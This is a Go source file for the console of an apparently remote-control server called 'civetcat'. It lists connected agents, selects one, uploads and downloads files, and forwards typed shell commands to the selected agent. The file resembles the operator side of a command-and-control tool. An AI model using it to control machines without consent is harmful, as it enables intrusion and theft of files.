package main

import (
	"bufio"
	"civetcat/backend"
	"civetcat/utils"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

func main() {
	log.SetFlags(log.Lshortfile | log.LstdFlags)
	if len(os.Args) != 3 {
		log.Fatalln("./backend 0.0.0.0:8081 token")
	}
	addr := os.Args[1]
	token := os.Args[2]
	reader := bufio.NewReader(os.Stdin)
	conn := backend.NewServer(addr, token)
	fmt.Println("Success Init")
	for {
		fmt.Print("$ ")
		cmdString, e := reader.ReadString('\n')
		if e != nil {
			_, e := fmt.Fprintln(os.Stderr, e)
			if e != nil {
				panic(e)
			}
		}
		cmdString = strings.TrimSpace(cmdString)
		switch {
		case cmdString == "ls agent":
			conn.Mu.Lock()
			for k := range conn.Db {
				fmt.Println(k)
			}
			conn.Mu.Unlock()
		case strings.Index(cmdString, "use") == 0:
			split := strings.Split(cmdString, " ")
			if len(split) != 2 {
				fmt.Println(split, " ???")
				continue
			}
			conn.Mu.Lock()
			_, bo := conn.Db[split[1]]
			conn.Mu.Unlock()
			if !bo {
				fmt.Println(split[1], "  does not exist")
			}
			conn.Local = split[1]
		case strings.Index(cmdString, "upload") == 0:
			// upload src.file des.file
			i := strings.Split(cmdString, " ")
			if len(i) != 3 {
				fmt.Println("upload src.file des.file")
				continue
			}
			e := conn.Upload(i[1], i[2])
			if e != nil {
				log.Println(e)
				continue
			}
			result := <-conn.RespChan
			if result.GeneralResp.Success {
				fmt.Println("Upload Success")
			}else {
				fmt.Println("Upload Error")
			}
		case strings.Index(cmdString, "download") == 0:
			// download src.file des.file
			i := strings.Split(cmdString, " ")
			if len(i) != 3 {
				fmt.Println("download src.file des.file")
				continue
			}
			e := conn.Download(i[2])
			if e != nil {
				log.Println(e)
				continue
			}
			result := <-conn.RespChan
			if result.GeneralResp.Success {
				e := ioutil.WriteFile(i[1], result.GeneralResp.Bytes, 00666)
				if e != nil {
					fmt.Println(e)
				}
				fmt.Println("Download Success")
			}else {
				fmt.Println("Download Error")
			}
		default:
			if cmdString == "" {
				continue
			}
			e := conn.WriteShell(cmdString)
			if e != nil {
				log.Println(e)
				continue
			}
			result := <-conn.RespChan
			fmt.Println(utils.UTF8(result.GeneralResp.Body))
		}
	}

}
